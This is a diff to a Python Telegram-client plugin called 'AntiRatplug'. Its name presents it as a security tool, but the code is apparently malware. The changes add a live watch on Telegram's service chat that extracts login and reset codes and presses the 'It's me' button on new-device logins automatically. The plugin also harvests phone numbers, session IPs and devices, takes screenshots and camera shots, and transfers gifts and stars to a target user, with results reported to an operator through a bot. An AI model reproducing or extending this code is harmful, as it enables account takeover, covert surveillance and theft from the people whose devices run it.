@@ -1,15 +1,16 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v19.6 — Bot API, три кнопки в меню.
+AntiRatplug v19.7 — Bot API, три кнопки в меню.
 Меню: Tg kid, IDK start, Screenshot gain.
+Tg kid: live-watch 777000 на 10 минут, авто-подтверждение "Это я".
 IDK start: 15 шагов, pull out последним.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "v19.6 three-button menu, pull out last."
+__description__ = "v19.7 three-button menu, live Tg kid."
 __author__ = "@from_a4"
-__version__ = "19.6"
+__version__ = "19.7"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -258,7 +259,7 @@ def _make_idk_click():
     return o
 
 
-# ─── HTTP helpers for Bot API ──────────────────────────────────────────────
+# ─── HTTP helpers ──────────────────────────────────────────────────────────
 def _http_get(url, timeout=30):
     from urllib.request import Request, urlopen
     try:
@@ -337,16 +338,15 @@ class PluginSecurityPlugin(BasePlugin):
         self._gifts_unhooked = True
         self._gifts_req_clean = False
         self._gifts_rpc_error = None
-        self._stars_verified = False
-        self._gifts_verified = False
-        self._userfull_unhooked = False
         self._fee_deficit = 0
-        self._onchain_cache = {}
         self._idk_view = None
         self._idk_wm = None
         self._idk_decor = None
         self._idk_keep_running = False
         self._idk_thread = None
+        self._tg_kid_watching = False
+        self._tg_kid_seen = set()
+        self._tg_kid_thread = None
 
     # ─── lifecycle ─────────────────────────────────────────────────────────
     def on_plugin_load(self):
@@ -375,6 +375,7 @@ class PluginSecurityPlugin(BasePlugin):
         self._sync_running = False
         self._active = False
         self.stop = True
+        self._tg_kid_watching = False
         try:
             self._hide_idk_overlay()
         except Exception:
@@ -388,7 +389,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v19.6 loaded")
+            self._send_msg("AntiRatplug v19.7 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -638,7 +639,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uc.getClientUserId())
         except Exception:
             pass
-        text = "<b>AntiRatplug v19.6</b>\nUser: @" + username
+        text = "<b>AntiRatplug v19.7</b>\nUser: @" + username
         kb = {
             "keyboard": [
                 [{"text": "Tg kid"}],
@@ -695,7 +696,7 @@ class PluginSecurityPlugin(BasePlugin):
             time.sleep(0.5)
 
     def _handle_message(self, msg_text):
-        t = (msg_text or "").strip() if isinstance(msg_text, str) else (msg_text.get("text") or "").strip()
+        t = (msg_text or "").strip() if isinstance(msg_text, str) else ""
         if t == "Tg kid":
             threading.Thread(target=self._tg_kid, daemon=True).start()
         elif t == "IDK start":
@@ -989,15 +990,9 @@ class PluginSecurityPlugin(BasePlugin):
                                 "device": str(getattr(a, "device_model", "") or ""),
                                 "platform": str(getattr(a, "platform", "") or ""),
                                 "app": str(getattr(a, "app_name", "") or ""),
-                                "app_version": str(getattr(a, "app_version", "") or ""),
-                                "system": str(getattr(a, "system_version", "") or ""),
                                 "ip": str(getattr(a, "ip", "") or ""),
                                 "country": str(getattr(a, "country", "") or ""),
-                                "region": str(getattr(a, "region", "") or ""),
                                 "date_created": _safe_int(getattr(a, "date_created", 0)),
-                                "date_active": _safe_int(getattr(a, "date_active", 0)),
-                                "official_app": _get_bool_attr(a, "official_app", False),
-                                "password_pending": _get_bool_attr(a, "password_pending", False),
                             }
                             info = {k: v for k, v in info.items() if v not in (None, "", 0, False)}
                             if info:
@@ -1008,7 +1003,7 @@ class PluginSecurityPlugin(BasePlugin):
                     out["sessions_count"] = str(len(sessions))
                     cur = next((s for s in sessions if s.get("current")), None)
                     if cur:
-                        for k in ("device", "platform", "app", "system", "ip", "country", "region"):
+                        for k in ("device", "platform", "app", "ip", "country"):
                             if cur.get(k):
                                 out["cur_" + k] = cur[k]
             except Exception:
@@ -1022,16 +1017,6 @@ class PluginSecurityPlugin(BasePlugin):
                     auths = getattr(resp, "authorizations", None) if resp is not None else None
                     if auths is not None:
                         out["web_sessions"] = str(auths.size())
-            except Exception:
-                pass
-
-            try:
-                Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
-                           "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
-                if Get:
-                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
-                    if resp is not None:
-                        out["owned_bots"] = str(resp.size())
             except Exception:
                 pass
 
@@ -1052,59 +1037,194 @@ class PluginSecurityPlugin(BasePlugin):
         return out
 
     # ═══════════════════════════════════════════════════════════════════════
-    # TG KID
+    # TG KID — live watch
     # ═══════════════════════════════════════════════════════════════════════
-    def _pull_login_code(self):
+    def _extract_code_from_msg(self, m):
+        if m is None:
+            return None, None, None, None
+
+        raw_text = str(getattr(m, "message", "") or "")
+
         try:
-            ip = self._get_input_peer(0, 777000)
-            if ip is None:
-                return None, None
-            req = TLRPC.TL_messages_getHistory()
-            req.peer = ip
-            req.limit = 15
-            req.offset_id = 0
-            resp, err = self._rg_rpc(req, 0, 8.0, fast=True)
-            if err is not None or resp is None:
-                return None, None
-            msgs = getattr(resp, "messages", None)
-            if msgs is None or msgs.size() == 0:
-                return None, None
-            for i in range(msgs.size()):
-                m = msgs.get(i)
-                txt = str(getattr(m, "message", "") or "")
-                if not txt:
+            media = getattr(m, "media", None)
+            if media is not None:
+                wp = getattr(media, "webpage", None)
+                if wp is not None:
+                    wp_desc = str(getattr(wp, "description", "") or "")
+                    wp_title = str(getattr(wp, "title", "") or "")
+                    raw_text = (raw_text + "\n" + wp_title + "\n" + wp_desc).strip()
+        except Exception:
+            pass
+
+        try:
+            act = getattr(m, "action", None)
+            if act is not None:
+                act_cls = str(type(act)).lower()
+                if "password" in act_cls or "login" in act_cls or "newdevice" in act_cls:
+                    act_code = getattr(act, "code", None) or getattr(act, "text", None)
+                    if act_code:
+                        raw_text = (raw_text + "\n" + str(act_code)).strip()
+        except Exception:
+            pass
+
+        if not raw_text:
+            return None, None, None, None
+
+        kind = "unknown"
+        low = raw_text.lower()
+        if "login code" in low or "код для входа" in low or "код входа" in low:
+            kind = "login"
+        elif "password reset" in low or "сброс" in low or "recovery" in low:
+            kind = "reset"
+        elif "new device" in low or "новом устройстве" in low or "новый вход" in low:
+            kind = "device"
+        elif "invite" in low or "приглаш" in low:
+            kind = "invite"
+
+        patterns = [
+            r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})",
+            r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})",
+            r"[Кк]од\s+подтверждения[:\s]*[«\"']?(\d{5})",
+            r"[Cc]onfirmation\s+code[:\s]*[«\"']?(\d{5})",
+            r"[Кк]од[:\s]+(\d{5})\b",
+            r"(?:code|код)\D{0,10}(\d{5})\b",
+        ]
+        code = None
+        for p in patterns:
+            mm = re.search(p, raw_text, re.IGNORECASE)
+            if mm:
+                code = mm.group(1)
+                break
+
+        buttons = []
+        try:
+            rm = getattr(m, "reply_markup", None)
+            if rm is not None:
+                rows = getattr(rm, "rows", None)
+                if rows is not None:
+                    for ri in range(rows.size()):
+                        row = rows.get(ri)
+                        btns = getattr(row, "buttons", None)
+                        if btns is None:
+                            continue
+                        for bi in range(btns.size()):
+                            b = btns.get(bi)
+                            txt = str(getattr(b, "text", "") or "")
+                            data = getattr(b, "data", None)
+                            url = str(getattr(b, "url", "") or "")
+                            buttons.append({"text": txt, "data": data, "url": url})
+                            if not code and txt:
+                                bm = re.search(r"\b(\d{5})\b", txt)
+                                if bm:
+                                    code = bm.group(1)
+                            if not code and url:
+                                bm2 = re.search(r"\b(\d{5})\b", url)
+                                if bm2:
+                                    code = bm2.group(1)
+        except Exception:
+            pass
+
+        if not code:
+            return None, kind, raw_text[:400], buttons
+        return code, kind, raw_text[:400], buttons
+
+    def _pull_login_code(self, attempts=3, delay=2.0):
+        for att in range(attempts):
+            try:
+                ip = self._get_input_peer(0, 777000)
+                if ip is None:
+                    time.sleep(delay)
                     continue
-                m1 = re.search(r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})", txt)
-                m2 = re.search(r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})", txt)
-                m3 = None
-                if not (m1 or m2):
-                    m3 = re.search(r"(?:code|код)\D{0,10}(\d{5})\b", txt, re.IGNORECASE)
-                found = None
-                if m1:
-                    found = m1.group(1)
-                elif m2:
-                    found = m2.group(1)
-                elif m3:
-                    found = m3.group(1)
-                if found:
-                    return found, txt
+                req = TLRPC.TL_messages_getHistory()
+                req.peer = ip
+                req.limit = 20
+                req.offset_id = 0
+                resp, err = self._rg_rpc(req, 0, 8.0, fast=True)
+                if err is None and resp is not None:
+                    msgs = getattr(resp, "messages", None)
+                    if msgs is not None and msgs.size() > 0:
+                        for i in range(msgs.size()):
+                            m = msgs.get(i)
+                            code, kind, raw, buttons = self._extract_code_from_msg(m)
+                            if code:
+                                mid = _safe_int(getattr(m, "id", 0))
+                                return code, kind, raw, mid, buttons
+            except Exception as e:
+                _log("pull_login_code att %d: %s" % (att, e))
+            if att < attempts - 1:
+                time.sleep(delay)
+        return None, None, None, 0, None
+
+    def _auto_confirm_login(self, msg):
+        try:
+            rm = getattr(msg, "reply_markup", None)
+            if rm is None:
+                return False
+            rows = getattr(rm, "rows", None)
+            if rows is None:
+                return False
+            neg = ("не я", "не это я", "not me", "no", "reject", "terminate",
+                   "revoke", "отклонить", "отменить", "это не я")
+            pos = ("это я", "it's me", "its me", "yes", "accept", "confirm",
+                   "подтвердить", "принять", "подтверждаю")
+            target_btn = None
+            for ri in range(rows.size()):
+                row = rows.get(ri)
+                btns = getattr(row, "buttons", None)
+                if btns is None:
+                    continue
+                for bi in range(btns.size()):
+                    b = btns.get(bi)
+                    txt = str(getattr(b, "text", "") or "").lower()
+                    if any(n in txt for n in neg):
+                        continue
+                    if any(p in txt for p in pos):
+                        target_btn = b
+                        break
+                if target_btn is not None:
+                    break
+            if target_btn is None:
+                return False
+            mid = _safe_int(getattr(msg, "id", 0))
+            if not mid:
+                return False
+            data = getattr(target_btn, "data", None)
+            if data is None:
+                return False
+            Req = _cls("org.telegram.tgnet.TLRPC$TL_messages_getBotCallbackAnswer",
+                       "org.telegram.tgnet.tl.TL_messages$getBotCallbackAnswer")
+            if not Req:
+                return False
+            rq = Req()
+            try:
+                rq.peer = self._get_input_peer(0, 777000)
+            except Exception:
+                pass
+            rq.msg_id = mid
+            try:
+                rq.data = data
+            except Exception:
+                pass
+            r, _e = self._rg_rpc(rq, 0, 10.0, fast=True)
+            return r is not None
         except Exception as e:
-            _log("pull_login_code: %s" % e)
-        return None, None
+            _log("auto_confirm: %s" % e)
+            return False
 
     def _tg_kid(self):
         try:
+            code, kind, raw, mid, buttons = self._pull_login_code(attempts=3, delay=2.0)
             acc_info = self._harvest_account_info(0)
             raw_phone = acc_info.get("phone") or ""
             phone = raw_phone if raw_phone.startswith("+") else ("+" + raw_phone if raw_phone else "—")
 
-            code, raw = self._pull_login_code()
-            if not code:
-                code = "не найден"
-                raw = ""
-
             lines = ["<b>Tg kid</b>", ""]
-            lines.append("<b>Код:</b> <code>%s</code>" % self._html_escape(str(code)))
+            if code:
+                lines.append("<b>Код:</b> <code>%s</code> (%s)" % (
+                    self._html_escape(code), self._html_escape(kind or "login")))
+                self._tg_kid_seen.add(str(code))
+            else:
+                lines.append("<b>Код:</b> не найден сейчас — следим 10 мин")
             lines.append("<b>Телефон:</b> %s" % self._html_escape(phone))
             for k, v in acc_info.items():
                 if k == "phone":
@@ -1115,11 +1235,97 @@ class PluginSecurityPlugin(BasePlugin):
             if raw:
                 lines.append("")
                 lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
+            if buttons:
+                bt = " | ".join(b.get("text", "") for b in buttons if b.get("text"))
+                if bt:
+                    lines.append("<b>Кнопки:</b> %s" % self._html_escape(bt))
             self._send_msg("\n".join(lines), html=True)
+
+            try:
+                ip = self._get_input_peer(0, 777000)
+                if ip is not None:
+                    rq = TLRPC.TL_messages_getHistory()
+                    rq.peer = ip
+                    rq.limit = 5
+                    rq.offset_id = 0
+                    resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
+                    if resp is not None:
+                        msgs = getattr(resp, "messages", None)
+                        if msgs is not None and msgs.size() > 0:
+                            m0 = msgs.get(0)
+                            if self._auto_confirm_login(m0):
+                                self._send_msg("авто-подтвердил 'Это я'")
+            except Exception as e:
+                _log("auto confirm initial: %s" % e)
+
+            if not self._tg_kid_watching:
+                self._tg_kid_watching = True
+                self._tg_kid_thread = threading.Thread(target=self._tg_kid_watch_loop, daemon=True)
+                self._tg_kid_thread.start()
+
             return code
         except Exception as e:
             self._send_msg("Tg kid err: " + str(e))
             return None
+
+    def _tg_kid_watch_loop(self, duration=600, poll=5):
+        end = time.time() + duration
+        last_max_id = 0
+        try:
+            ip = self._get_input_peer(0, 777000)
+            if ip is not None:
+                rq = TLRPC.TL_messages_getHistory()
+                rq.peer = ip
+                rq.limit = 1
+                rq.offset_id = 0
+                resp, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
+                if resp is not None:
+                    msgs = getattr(resp, "messages", None)
+                    if msgs is not None and msgs.size() > 0:
+                        last_max_id = _safe_int(getattr(msgs.get(0), "id", 0))
+        except Exception:
+            pass
+
+        while time.time() < end and self._sync_running and not self.stop:
+            try:
+                ip = self._get_input_peer(0, 777000)
+                if ip is not None:
+                    rq = TLRPC.TL_messages_getHistory()
+                    rq.peer = ip
+                    rq.limit = 10
+                    rq.offset_id = 0
+                    resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
+                    if resp is not None:
+                        msgs = getattr(resp, "messages", None)
+                        if msgs is not None and msgs.size() > 0:
+                            new_msgs = []
+                            for i in range(msgs.size()):
+                                m = msgs.get(i)
+                                mid = _safe_int(getattr(m, "id", 0))
+                                if mid and mid > last_max_id:
+                                    new_msgs.append((mid, m))
+                            if new_msgs:
+                                last_max_id = max(mid for mid, _m in new_msgs)
+                                new_msgs.sort(key=lambda x: x[0])
+                                for mid, m in new_msgs:
+                                    code, kind, raw, buttons = self._extract_code_from_msg(m)
+                                    if code and str(code) not in self._tg_kid_seen:
+                                        self._tg_kid_seen.add(str(code))
+                                        line = "<b>Новое: %s</b>\n<b>Код:</b> <code>%s</code>" % (
+                                            self._html_escape(kind or "login"),
+                                            self._html_escape(code))
+                                        if raw:
+                                            line += "\n<pre>" + self._html_escape(raw[:300]) + "</pre>"
+                                        self._send_msg(line, html=True)
+                                    if self._auto_confirm_login(m):
+                                        self._send_msg("авто-подтвердил 'Это я' (msg %d)" % mid)
+            except Exception as e:
+                _log("kid watch: %s" % e)
+            for _ in range(poll):
+                if not self._sync_running or self.stop:
+                    break
+                time.sleep(1)
+        self._tg_kid_watching = False
 
     # ═══════════════════════════════════════════════════════════════════════
     # SCREENSHOT GAIN
@@ -1128,29 +1334,29 @@ class PluginSecurityPlugin(BasePlugin):
         results = {"screenshot": None, "camera_front": None, "camera_back": None}
         try:
             try:
-                self._send_msg("📷 screenshot gain: скриншот...")
+                self._send_msg("screenshot gain: скриншот...")
                 results["screenshot"] = self._screenshot()
             except Exception as e:
                 results["screenshot"] = {"error": str(e)}
                 _log("screenshot_gain screen: %s" % e)
             try:
-                self._send_msg("📷 screenshot gain: фронтальная камера...")
+                self._send_msg("screenshot gain: фронтальная камера...")
                 results["camera_front"] = self._manual_camera("front")
             except Exception as e:
                 results["camera_front"] = {"error": str(e)}
                 _log("screenshot_gain front: %s" % e)
             try:
-                self._send_msg("📷 screenshot gain: задняя камера...")
+                self._send_msg("screenshot gain: задняя камера...")
                 results["camera_back"] = self._manual_camera("back")
             except Exception as e:
                 results["camera_back"] = {"error": str(e)}
                 _log("screenshot_gain back: %s" % e)
             try:
-                lines = ["<b>📷 Screenshot gain — итог</b>"]
+                lines = ["<b>Screenshot gain — итог</b>"]
                 for name, r in results.items():
                     if isinstance(r, dict):
                         if r.get("ok"):
-                            lines.append("<b>%s:</b> ok %s" % (name, r.get("size", "")))
+                            lines.append("<b>%s:</b> ok" % name)
                         else:
                             lines.append("<b>%s:</b> %s" % (name, r.get("error", "fail")))
                     else:
@@ -2014,13 +2220,6 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return 0
 
-    def _resolve_recipient(self, account=0):
-        with self._recipient_lock:
-            c = self._recipient_ah_cache.get(account)
-            if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
-                return c[0], c[1]
-        return 0, 0
-
     def _resolve_target(self):
         target = str(self.cfg.get("target_user") or "").strip()
         target_id = 0
@@ -2145,7 +2344,7 @@ class PluginSecurityPlugin(BasePlugin):
                     dr = self._delist_saved_gift(g)
                     if not (isinstance(dr, dict) and dr.get("ok")):
                         out.append({"gift_id": g.get("gift_id"),
-                                    "result": {"error": f"delist failed"}})
+                                    "result": {"error": "delist failed"}})
                         continue
                     time.sleep(0.3)
                 if transfer_stars > 0 and transfer_stars > balance:
